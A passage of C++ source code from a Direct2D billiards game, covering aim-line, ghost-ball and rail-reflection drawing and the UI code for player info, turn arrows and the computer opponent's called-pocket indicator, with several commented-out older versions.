        if (!isHumanInteracting && !isAiVisualizingShot) {
            return;
        }

        Ball* cueBall = GetCueBall();
        if (!cueBall || cueBall->isPocketed) return;

        // --- Brush and Style Creation (No changes here) ---
        ID2D1SolidColorBrush* pBrush = nullptr;
        ID2D1SolidColorBrush* pGhostBrush = nullptr;
        ID2D1StrokeStyle* pDashedStyle = nullptr;
        ID2D1SolidColorBrush* pCueBrush = nullptr;
        ID2D1SolidColorBrush* pReflectBrush = nullptr;
        ID2D1SolidColorBrush* pCyanBrush = nullptr;
        ID2D1SolidColorBrush* pPurpleBrush = nullptr;
        pRT->CreateSolidColorBrush(AIM_LINE_COLOR, &pBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White, 0.5f), &pGhostBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(0.6f, 0.4f, 0.2f), &pCueBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::LightCyan, 0.6f), &pReflectBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Cyan), &pCyanBrush);
        pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Purple), &pPurpleBrush);
        if (pFactory) {
            D2D1_STROKE_STYLE_PROPERTIES strokeProps = D2D1::StrokeStyleProperties();
            strokeProps.dashStyle = D2D1_DASH_STYLE_DASH;
            pFactory->CreateStrokeStyle(&strokeProps, nullptr, 0, &pDashedStyle);
        }
        // --- End Brush Creation ---

        // --- FOOLPROOF FIX: Use the AI's planned angle and power for drawing ---
        float angleToDraw = cueAngle;
        float powerToDraw = shotPower;

        if (isAiVisualizingShot) {
            // When the AI is showing its aim, force the drawing to use its planned shot details.
            angleToDraw = aiPlannedShotDetails.angle;
            powerToDraw = aiPlannedShotDetails.power;
        }
        // --- End AI Aiming Fix ---

        // --- Cue Stick Drawing ---
        const float baseStickLength = 150.0f;
        const float baseStickThickness = 4.0f;
        float stickLength = baseStickLength * 1.4f;
        float stickThickness = baseStickThickness * 1.5f;
        float stickAngle = angleToDraw + PI; // Use the angle we determined
        float powerOffset = 0.0f;
        if ((isAiming || isDraggingStick) || isAiVisualizingShot) {
            powerOffset = powerToDraw * 5.0f; // Use the power we determined
        }
        D2D1_POINT_2F cueStickEnd = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (stickLength + powerOffset), cueBall->y + sinf(stickAngle) * (stickLength + powerOffset));
        D2D1_POINT_2F cueStickTip = D2D1::Point2F(cueBall->x + cosf(stickAngle) * (powerOffset + 5.0f), cueBall->y + sinf(stickAngle) * (powerOffset + 5.0f));
        pRT->DrawLine(cueStickTip, cueStickEnd, pCueBrush, stickThickness);

        // --- Projection Line Calculation ---
        float cosA = cosf(angleToDraw); // Use the angle we determined
        float sinA = sinf(angleToDraw);
        float rayLength = TABLE_WIDTH + TABLE_HEIGHT;
        D2D1_POINT_2F rayStart = D2D1::Point2F(cueBall->x, cueBall->y);
        D2D1_POINT_2F rayEnd = D2D1::Point2F(rayStart.x + cosA * rayLength, rayStart.y + sinA * rayLength);

        // Find the first ball hit by the aiming ray
        Ball* hitBall = nullptr;
        float firstHitDistSq = -1.0f;
        D2D1_POINT_2F ballCollisionPoint = { 0, 0 }; // Point on target ball circumference
        D2D1_POINT_2F ghostBallPosForHit = { 0, 0 }; // Ghost ball pos for the hit ball

        hitBall = FindFirstHitBall(rayStart, cueAngle, firstHitDistSq);
        if (hitBall) {
            // Calculate the point on the target ball's circumference
            float collisionDist = sqrtf(firstHitDistSq);
            ballCollisionPoint = D2D1::Point2F(rayStart.x + cosA * collisionDist, rayStart.y + sinA * collisionDist);
            // Calculate ghost ball position for this specific hit (used for projection consistency)
            ghostBallPosForHit = D2D1::Point2F(hitBall->x - cosA * BALL_RADIUS, hitBall->y - sinA * BALL_RADIUS); // Approx.
        }

        // Find the first rail hit by the aiming ray
        D2D1_POINT_2F railHitPoint = rayEnd; // Default to far end if no rail hit
        float minRailDistSq = rayLength * rayLength;
        int hitRailIndex = -1; // 0:Left, 1:Right, 2:Top, 3:Bottom

        // Define table edge segments for intersection checks
        D2D1_POINT_2F topLeft = D2D1::Point2F(TABLE_LEFT, TABLE_TOP);
        D2D1_POINT_2F topRight = D2D1::Point2F(TABLE_RIGHT, TABLE_TOP);
        D2D1_POINT_2F bottomLeft = D2D1::Point2F(TABLE_LEFT, TABLE_BOTTOM);
        D2D1_POINT_2F bottomRight = D2D1::Point2F(TABLE_RIGHT, TABLE_BOTTOM);

        D2D1_POINT_2F currentIntersection;

        // Check Left Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, bottomLeft, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 0; }
        }
        // Check Right Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topRight, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 1; }
        }
        // Check Top Rail
        if (LineSegmentIntersection(rayStart, rayEnd, topLeft, topRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 2; }
        }
        // Check Bottom Rail
        if (LineSegmentIntersection(rayStart, rayEnd, bottomLeft, bottomRight, currentIntersection)) {
            float distSq = GetDistanceSq(rayStart.x, rayStart.y, currentIntersection.x, currentIntersection.y);
            if (distSq < minRailDistSq) { minRailDistSq = distSq; railHitPoint = currentIntersection; hitRailIndex = 3; }
        }


        // --- Determine final aim line end point ---
        D2D1_POINT_2F finalLineEnd = railHitPoint; // Assume rail hit first
        bool aimingAtRail = true;

        if (hitBall && firstHitDistSq < minRailDistSq) {
            // Ball collision is closer than rail collision
            finalLineEnd = ballCollisionPoint; // End line at the point of contact on the ball
            aimingAtRail = false;
        }

        // --- Draw Primary Aiming Line ---
        pRT->DrawLine(rayStart, finalLineEnd, pBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

        // --- Draw Target Circle/Indicator ---
        D2D1_ELLIPSE targetCircle = D2D1::Ellipse(finalLineEnd, BALL_RADIUS / 2.0f, BALL_RADIUS / 2.0f);
        pRT->DrawEllipse(&targetCircle, pBrush, 1.0f);

        // --- Draw Projection/Reflection Lines ---
        if (!aimingAtRail && hitBall) {
            // Aiming at a ball: Draw Ghost Cue Ball and Target Ball Projection
            D2D1_ELLIPSE ghostCue = D2D1::Ellipse(ballCollisionPoint, BALL_RADIUS, BALL_RADIUS); // Ghost ball at contact point
            pRT->DrawEllipse(ghostCue, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // Calculate target ball projection based on impact line (cue collision point -> target center)
            float targetProjectionAngle = atan2f(hitBall->y - ballCollisionPoint.y, hitBall->x - ballCollisionPoint.x);
            // Clamp angle calculation if distance is tiny
            if (GetDistanceSq(hitBall->x, hitBall->y, ballCollisionPoint.x, ballCollisionPoint.y) < 1.0f) {
                targetProjectionAngle = cueAngle; // Fallback if overlapping
            }

            D2D1_POINT_2F targetStartPoint = D2D1::Point2F(hitBall->x, hitBall->y);
            D2D1_POINT_2F targetProjectionEnd = D2D1::Point2F(
                hitBall->x + cosf(targetProjectionAngle) * 50.0f, // Projection length 50 units
                hitBall->y + sinf(targetProjectionAngle) * 50.0f
            );
            // Draw solid line for target projection
            //pRT->DrawLine(targetStartPoint, targetProjectionEnd, pBrush, 1.0f);

        //new code start

                    // Dual trajectory with edge-aware contact simulation
            D2D1_POINT_2F dir = {
                targetProjectionEnd.x - targetStartPoint.x,
                targetProjectionEnd.y - targetStartPoint.y
            };
            float dirLen = sqrtf(dir.x * dir.x + dir.y * dir.y);
            dir.x /= dirLen;
            dir.y /= dirLen;

            D2D1_POINT_2F perp = { -dir.y, dir.x };

            // Approximate cue ball center by reversing from tip
            D2D1_POINT_2F cueBallCenterForGhostHit = { // Renamed for clarity if you use it elsewhere
                targetStartPoint.x - dir.x * BALL_RADIUS,
                targetStartPoint.y - dir.y * BALL_RADIUS
            };

            // REAL contact-ball center - use your physics object's center:
            // (replace 'objectBallPos' with whatever you actually call it)
            // (targetStartPoint is already hitBall->x, hitBall->y)
            D2D1_POINT_2F contactBallCenter = targetStartPoint; // Corrected: Use the object ball's actual center
            //D2D1_POINT_2F contactBallCenter = D2D1::Point2F(hitBall->x, hitBall->y);

           // The 'offset' calculation below uses 'cueBallCenterForGhostHit' (originally 'cueBallCenter').
           // This will result in 'offset' being 0 because 'cueBallCenterForGhostHit' is defined
           // such that (targetStartPoint - cueBallCenterForGhostHit) is parallel to 'dir',
           // and 'perp' is perpendicular to 'dir'.
           // Consider Change 2 if this 'offset' is not behaving as intended for the secondary line.
            /*float offset = ((targetStartPoint.x - cueBallCenterForGhostHit.x) * perp.x +
                (targetStartPoint.y - cueBallCenterForGhostHit.y) * perp.y);*/
                /*float offset = ((targetStartPoint.x - cueBallCenter.x) * perp.x +
                    (targetStartPoint.y - cueBallCenter.y) * perp.y);
                float absOffset = fabsf(offset);
                float side = (offset >= 0 ? 1.0f : -1.0f);*/

                // Use actual cue ball center for offset calculation if 'offset' is meant to quantify the cut
            D2D1_POINT_2F actualCueBallPhysicalCenter = D2D1::Point2F(cueBall->x, cueBall->y); // This is also rayStart

            // Offset calculation based on actual cue ball position relative to the 'dir' line through targetStartPoint
            float offset = ((targetStartPoint.x - actualCueBallPhysicalCenter.x) * perp.x +
                (targetStartPoint.y - actualCueBallPhysicalCenter.y) * perp.y);
            float absOffset = fabsf(offset);
            float side = (offset >= 0 ? 1.0f : -1.0f);


            // Actual contact point on target ball edge
            D2D1_POINT_2F contactPoint = {
            contactBallCenter.x + perp.x * BALL_RADIUS * side,
            contactBallCenter.y + perp.y * BALL_RADIUS * side
            };

            // Tangent (cut shot) path from contact point
                // Tangent (cut shot) path: from contact point to contact ball center
            D2D1_POINT_2F objectBallDir = {
                contactBallCenter.x - contactPoint.x,
                contactBallCenter.y - contactPoint.y
            };
            float oLen = sqrtf(objectBallDir.x * objectBallDir.x + objectBallDir.y * objectBallDir.y);
            if (oLen != 0.0f) {
                objectBallDir.x /= oLen;
                objectBallDir.y /= oLen;
            }

            const float PRIMARY_LEN = 150.0f; //default=150.0f
            const float SECONDARY_LEN = 150.0f; //default=150.0f
            const float STRAIGHT_EPSILON = BALL_RADIUS * 0.05f;

            D2D1_POINT_2F primaryEnd = {
                targetStartPoint.x + dir.x * PRIMARY_LEN,
                targetStartPoint.y + dir.y * PRIMARY_LEN
            };

            // Secondary line starts from the contact ball's center
            D2D1_POINT_2F secondaryStart = contactBallCenter;
            D2D1_POINT_2F secondaryEnd = {
                secondaryStart.x + objectBallDir.x * SECONDARY_LEN,
                secondaryStart.y + objectBallDir.y * SECONDARY_LEN
            };

            if (absOffset < STRAIGHT_EPSILON)  // straight shot?
            {
                // Straight: secondary behind primary
                        // secondary behind primary {pDashedStyle param at end}
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            else
            {
                // Cut shot: both visible
                        // both visible for cut shot
                pRT->DrawLine(secondaryStart, secondaryEnd, pPurpleBrush, 2.0f);
                //pRT->DrawLine(secondaryStart, secondaryEnd, pGhostBrush, 1.0f);
                pRT->DrawLine(targetStartPoint, primaryEnd, pCyanBrush, 2.0f);
                //pRT->DrawLine(targetStartPoint, primaryEnd, pBrush, 1.0f);
            }
            // End improved trajectory logic

        //new code end

            // -- Cue Ball Path after collision (Optional, requires physics) --
            // Very simplified: Assume cue deflects, angle depends on cut angle.
            // float cutAngle = acosf(cosf(cueAngle - targetProjectionAngle)); // Angle between paths
            // float cueDeflectionAngle = ? // Depends on cutAngle, spin, etc. Hard to predict accurately.
            // D2D1_POINT_2F cueProjectionEnd = ...
            // pRT->DrawLine(ballCollisionPoint, cueProjectionEnd, pGhostBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);

            // --- Accuracy Comment ---
            // Note: The visual accuracy of this projection, especially for cut shots (hitting the ball off-center)
            // or shots with spin, is limited by the simplified physics model. Real pool physics involves
            // collision-induced throw, spin transfer, and cue ball deflection not fully simulated here.
            // The ghost ball method shows the *ideal* line for a center-cue hit without spin.

        }
        else if (aimingAtRail && hitRailIndex != -1) {
            // Aiming at a rail: Draw reflection line
            float reflectAngle = cueAngle;
            // Reflect angle based on which rail was hit
            if (hitRailIndex == 0 || hitRailIndex == 1) { // Left or Right rail
                reflectAngle = PI - cueAngle; // Reflect horizontal component
            }
            else { // Top or Bottom rail
                reflectAngle = -cueAngle; // Reflect vertical component
            }
            // Normalize angle if needed (atan2 usually handles this)
            while (reflectAngle > PI) reflectAngle -= 2 * PI;
            while (reflectAngle <= -PI) reflectAngle += 2 * PI;


            float reflectionLength = 60.0f; // Length of the reflection line
            D2D1_POINT_2F reflectionEnd = D2D1::Point2F(
                finalLineEnd.x + cosf(reflectAngle) * reflectionLength,
                finalLineEnd.y + sinf(reflectAngle) * reflectionLength
            );

            // Draw the reflection line (e.g., using a different color/style)
            pRT->DrawLine(finalLineEnd, reflectionEnd, pReflectBrush, 1.0f, pDashedStyle ? pDashedStyle : NULL);
        }

        // Release resources
        SafeRelease(&pBrush);
        SafeRelease(&pGhostBrush);
        SafeRelease(&pCueBrush);
        SafeRelease(&pReflectBrush); // Release new brush
        SafeRelease(&pCyanBrush);
        SafeRelease(&pPurpleBrush);
        SafeRelease(&pDashedStyle);
    }


    void DrawUI(ID2D1RenderTarget* pRT) {
        if (!pTextFormat || !pLargeTextFormat) return;

        ID2D1SolidColorBrush* pBrush = nullptr;
        pRT->CreateSolidColorBrush(UI_TEXT_COLOR, &pBrush);
        if (!pBrush) return;

        //new code
        // --- Always draw AI's 8?Ball call arrow when it's Player?2's turn and AI has called ---
        //if (isPlayer2AI && currentPlayer == 2 && calledPocketP2 >= 0) {
            // FIX: This condition correctly shows the AI's called pocket arrow.
        if (isPlayer2AI && IsPlayerOnEightBall(2) && calledPocketP2 >= 0) {
            // pocket index that AI called
            int idx = calledPocketP2;
            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    { P.x - 15.0f, P.y - 40.0f },
                    { P.x + 15.0f, P.y - 40.0f },
                    { P.x       , P.y - 10.0f }
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink);
                SafeRelease(&geom);
                SafeRelease(&pArrow);
            }
            // draw “Choose a pocket...” prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""AI has called this pocket"",
                (UINT32)wcslen(L""AI has called this pocket""),
                pTextFormat,
                &txt,
                pBrush
            );
            // note: no return here — we still draw fouls/turn text underneath
        }
        //end new code

        // --- Player Info Area (Top Left/Right) --- (Unchanged)
        float uiTop = TABLE_TOP - 80;
        float uiHeight = 60;
        float p1Left = TABLE_LEFT;
        float p1Width = 150;
        float p2Left = TABLE_RIGHT - p1Width;
        D2D1_RECT_F p1Rect = D2D1::RectF(p1Left, uiTop, p1Left + p1Width, uiTop + uiHeight);
        D2D1_RECT_F p2Rect = D2D1::RectF(p2Left, uiTop, p2Left + p1Width, uiTop + uiHeight);

        // Player 1 Info Text (Unchanged)
        std::wostringstream oss1;
        oss1 << player1Info.name.c_str() << L""\n"";
        if (player1Info.assignedType != BallType::NONE) {
            oss1 << ((player1Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss1 << L"" ["" << player1Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss1 << L""(Undecided)"";
        }
        pRT->DrawText(oss1.str().c_str(), (UINT32)oss1.str().length(), pTextFormat, &p1Rect, pBrush);
        // Draw Player 1 Side Ball
        if (player1Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player1Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p1Rect.right + 10.0f, p1Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player1Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }


        // Player 2 Info Text (Unchanged)
        std::wostringstream oss2;
        oss2 << player2Info.name.c_str() << L""\n"";
        if (player2Info.assignedType != BallType::NONE) {
            oss2 << ((player2Info.assignedType == BallType::SOLID) ? L""Solids (Yellow)"" : L""Stripes (Red)"");
            oss2 << L"" ["" << player2Info.ballsPocketedCount << L""/7]"";
        }
        else {
            oss2 << L""(Undecided)"";
        }
        pRT->DrawText(oss2.str().c_str(), (UINT32)oss2.str().length(), pTextFormat, &p2Rect, pBrush);
        // Draw Player 2 Side Ball
        if (player2Info.assignedType != BallType::NONE)
        {
            ID2D1SolidColorBrush* pBallBrush = nullptr;
            D2D1_COLOR_F ballColor = (player2Info.assignedType == BallType::SOLID) ?
                D2D1::ColorF(1.0f, 1.0f, 0.0f) : D2D1::ColorF(1.0f, 0.0f, 0.0f);
            pRT->CreateSolidColorBrush(ballColor, &pBallBrush);
            if (pBallBrush)
            {
                D2D1_POINT_2F ballCenter = D2D1::Point2F(p2Rect.right + 10.0f, p2Rect.top + 20.0f);
                float radius = 10.0f;
                D2D1_ELLIPSE ball = D2D1::Ellipse(ballCenter, radius, radius);
                pRT->FillEllipse(&ball, pBallBrush);
                SafeRelease(&pBallBrush);
                // Draw border around the ball
                ID2D1SolidColorBrush* pBorderBrush = nullptr;
                pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::Black), &pBorderBrush);
                if (pBorderBrush)
                {
                    pRT->DrawEllipse(&ball, pBorderBrush, 1.5f); // thin border
                    SafeRelease(&pBorderBrush);
                }

                // If stripes, draw a stripe band
                if (player2Info.assignedType == BallType::STRIPE)
                {
                    ID2D1SolidColorBrush* pStripeBrush = nullptr;
                    pRT->CreateSolidColorBrush(D2D1::ColorF(D2D1::ColorF::White), &pStripeBrush);
                    if (pStripeBrush)
                    {
                        D2D1_RECT_F stripeRect = D2D1::RectF(
                            ballCenter.x - radius,
                            ballCenter.y - 3.0f,
                            ballCenter.x + radius,
                            ballCenter.y + 3.0f
                        );
                        pRT->FillRectangle(&stripeRect, pStripeBrush);
                        SafeRelease(&pStripeBrush);
                    }
                }
            }
        }

        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            D2D1_RECT_F playerBox = (currentPlayer == 1) ? p1Rect : p2Rect;
            arrowBackX = playerBox.left - 25.0f;
            arrowTipX = arrowBackX + arrowSizeBase * 0.75f;

            float notchDepth = 12.0f;  // Increased from 6.0f to make the rectangle longer
            float notchWidth = 10.0f;

            float cx = arrowBackX;
            float cy = arrowCenterY;

            // Define triangle + rectangle tail shape
            D2D1_POINT_2F tip = D2D1::Point2F(arrowTipX, cy);                           // tip
            D2D1_POINT_2F baseTop = D2D1::Point2F(cx, cy - arrowSizeBase / 2.0f);          // triangle top
            D2D1_POINT_2F baseBot = D2D1::Point2F(cx, cy + arrowSizeBase / 2.0f);          // triangle bottom

            // Rectangle coordinates for the tail portion:
            D2D1_POINT_2F r1 = D2D1::Point2F(cx - notchDepth, cy - notchWidth / 2.0f);   // rect top-left
            D2D1_POINT_2F r2 = D2D1::Point2F(cx, cy - notchWidth / 2.0f);                 // rect top-right
            D2D1_POINT_2F r3 = D2D1::Point2F(cx, cy + notchWidth / 2.0f);                 // rect bottom-right
            D2D1_POINT_2F r4 = D2D1::Point2F(cx - notchDepth, cy + notchWidth / 2.0f);    // rect bottom-left

            ID2D1PathGeometry* pPath = nullptr;
            if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
                ID2D1GeometrySink* pSink = nullptr;
                if (SUCCEEDED(pPath->Open(&pSink))) {
                    pSink->BeginFigure(tip, D2D1_FIGURE_BEGIN_FILLED);
                    pSink->AddLine(baseTop);
                    pSink->AddLine(r2); // transition from triangle into rectangle
                    pSink->AddLine(r1);
                    pSink->AddLine(r4);
                    pSink->AddLine(r3);
                    pSink->AddLine(baseBot);
                    pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                    pSink->Close();
                    SafeRelease(&pSink);
                    pRT->FillGeometry(pPath, pArrowBrush);
                }
                SafeRelease(&pPath);
            }


            SafeRelease(&pArrowBrush);
        }

        //original
    /*
        // --- MODIFIED: Current Turn Arrow (Blue, Bigger, Beside Name) ---
        ID2D1SolidColorBrush* pArrowBrush = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrowBrush);
        if (pArrowBrush && currentGameState != GAME_OVER && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
            float arrowSizeBase = 32.0f; // Base size for width/height offsets (4x original ~8)
            float arrowCenterY = p1Rect.top + uiHeight / 2.0f; // Center vertically with text box
            float arrowTipX, arrowBackX;

            if (currentPlayer == 1) {
    arrowBackX = p1Rect.left - 25.0f; // Position left of the box
                arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
                // Define points for right-pointing arrow
                //D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
                //D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
                //D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back
                // Enhanced arrow with base rectangle intersection
        float notchDepth = 6.0f; // Depth of square base ""stem""
        float notchWidth = 4.0f; // Thickness of square part

        D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
        D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
        D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY - notchWidth / 2.0f); // Square Left-Top
        D2D1_POINT_2F pt4 = D2D1::Point2F(arrowBackX - notchDepth, arrowCenterY + notchWidth / 2.0f); // Square Left-Bottom
        D2D1_POINT_2F pt5 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back


        ID2D1PathGeometry* pPath = nullptr;
        if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
            ID2D1GeometrySink* pSink = nullptr;
            if (SUCCEEDED(pPath->Open(&pSink))) {
                pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
                pSink->AddLine(pt2);
                pSink->AddLine(pt3);
                pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
                pSink->Close();
                SafeRelease(&pSink);
                pRT->FillGeometry(pPath, pArrowBrush);
            }
            SafeRelease(&pPath);
        }
            }


            //==================else player 2
            else { // Player 2
             // Player 2: Arrow left of P2 box, pointing right (or right of P2 box pointing left?)
             // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    // Let's keep it consistent: Arrow left of the active player's box, pointing right.
    arrowBackX = p2Rect.left - 25.0f; // Position left of the box
    arrowTipX = arrowBackX + arrowSizeBase * 0.75f; // Pointy end extends right
    // Define points for right-pointing arrow
    D2D1_POINT_2F pt1 = D2D1::Point2F(arrowTipX, arrowCenterY); // Tip
    D2D1_POINT_2F pt2 = D2D1::Point2F(arrowBackX, arrowCenterY - arrowSizeBase / 2.0f); // Top-Back
    D2D1_POINT_2F pt3 = D2D1::Point2F(arrowBackX, arrowCenterY + arrowSizeBase / 2.0f); // Bottom-Back

    ID2D1PathGeometry* pPath = nullptr;
    if (SUCCEEDED(pFactory->CreatePathGeometry(&pPath))) {
        ID2D1GeometrySink* pSink = nullptr;
        if (SUCCEEDED(pPath->Open(&pSink))) {
            pSink->BeginFigure(pt1, D2D1_FIGURE_BEGIN_FILLED);
            pSink->AddLine(pt2);
            pSink->AddLine(pt3);
            pSink->EndFigure(D2D1_FIGURE_END_CLOSED);
            pSink->Close();
            SafeRelease(&pSink);
            pRT->FillGeometry(pPath, pArrowBrush);
        }
        SafeRelease(&pPath);
    }
            }
            */


            // --- Persistent Blue 8?Ball Call Arrow & Prompt ---
        /*if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
        {
            // determine index (default top?right)
            int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
            if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
            if (idx < 0) idx = 2;

            // draw large blue arrow
            ID2D1SolidColorBrush* pArrow = nullptr;
            pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
            if (pArrow) {
                auto P = pocketPositions[idx];
                D2D1_POINT_2F tri[3] = {
                    {P.x - 15.0f, P.y - 40.0f},
                    {P.x + 15.0f, P.y - 40.0f},
                    {P.x       , P.y - 10.0f}
                };
                ID2D1PathGeometry* geom = nullptr;
                pFactory->CreatePathGeometry(&geom);
                ID2D1GeometrySink* sink = nullptr;
                geom->Open(&sink);
                sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
                sink->AddLines(&tri[1], 2);
                sink->EndFigure(D2D1_FIGURE_END_CLOSED);
                sink->Close();
                pRT->FillGeometry(geom, pArrow);
                SafeRelease(&sink); SafeRelease(&geom); SafeRelease(&pArrow);
            }

            // draw prompt
            D2D1_RECT_F txt = D2D1::RectF(
                TABLE_LEFT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 5.0f,
                TABLE_RIGHT,
                TABLE_BOTTOM + CUSHION_THICKNESS + 30.0f
            );
            pRT->DrawText(
                L""Choose a pocket..."",
                (UINT32)wcslen(L""Choose a pocket...""),
                pTextFormat,
                &txt,
                pBrush
            );
        }*/

        // --- Persistent Blue 8?Ball Pocket Arrow & Prompt (once called) ---
    /* if (calledPocketP1 >= 0 || calledPocketP2 >= 0)
    {
        // 1) Determine pocket index
        int idx = (currentPlayer == 1 ? calledPocketP1 : calledPocketP2);
        // If the other player had called but it's now your turn, still show that call
        if (idx < 0) idx = (currentPlayer == 1 ? calledPocketP2 : calledPocketP1);
        if (idx < 0) idx = 2; // default to top?right if somehow still unset

        // 2) Draw large blue arrow
        ID2D1SolidColorBrush* pArrow = nullptr;
        pRT->CreateSolidColorBrush(TURN_ARROW_COLOR, &pArrow);
        if (pArrow) {
            auto P = pocketPositions[idx];
            D2D1_POINT_2F tri[3] = {
                { P.x - 15.0f, P.y - 40.0f },
                { P.x + 15.0f, P.y - 40.0f },
                { P.x       , P.y - 10.0f }
            };
            ID2D1PathGeometry* geom = nullptr;
            pFactory->CreatePathGeometry(&geom);
            ID2D1GeometrySink* sink = nullptr;
            geom->Open(&sink);
            sink->BeginFigure(tri[0], D2D1_FIGURE_BEGIN_FILLED);
            sink->AddLines(&tri[1], 2);
            sink->EndFigure(D2D1_FIGURE_END_CLOSED);
            sink->Close();
            pRT->FillGeometry(geom, pArrow);
            SafeRelease(&sink);
            SafeRelease(&geom);
            SafeRelease(&pArrow);
        }

        // 3) Draw persistent prompt text
        D2D1_RECT_F txt = D2D1::RectF(
            TABLE_LEFT,
